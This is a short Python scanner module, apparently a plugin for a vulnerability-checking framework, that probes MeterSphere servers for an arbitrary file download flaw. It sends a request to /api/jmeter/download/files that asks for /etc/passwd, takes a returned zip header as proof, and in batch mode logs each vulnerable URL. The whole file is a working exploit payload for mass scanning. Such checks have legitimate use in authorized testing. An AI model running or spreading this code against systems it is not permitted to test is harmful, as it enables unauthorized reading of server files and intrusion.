import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()
class MeterSphereDumpFileScan:
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        headers = target["header"]
        proxy = target["proxy"]
        ssl = target["ssl"]
        _, proxys = ReqSet(proxy=proxy, bwork=self.batch)


        header = {
            "User-Agent": headers,
            "Content-Type": "application/json"
        }
        if not self.batch:
            OutPrintInfo("MeterSphere", "开始检测漏洞")
        try:
            data = '{"reportId":"183888","bodyFiles":[{"id":"aaa","name":"/etc/passwd"}]}'
            req_url = f"{url}/api/jmeter/download/files"
            response = requests.post(req_url,verify=ssl,data=data,headers=header,proxies=proxys)
            if "183888.zip" in response.headers['Content-Disposition']:
                OutPrintInfoSuc("MeterSphere",f"存在任意文件下载 {req_url}")
                if self.batch:
                    with open("./result/metersphere_dump_file.txt","a") as w:
                        w.write(f"{req_url}\n")
            else:
                if not self.batch:
                    OutPrintInfo("MeterSphere", "不存在任意文件下载")
        except Exception:
            if not self.batch:
                OutPrintInfo("MeterSphere", "目标访问失败")
        if not self.batch:
            OutPrintInfo("MeterSphere", "漏洞检测结束")
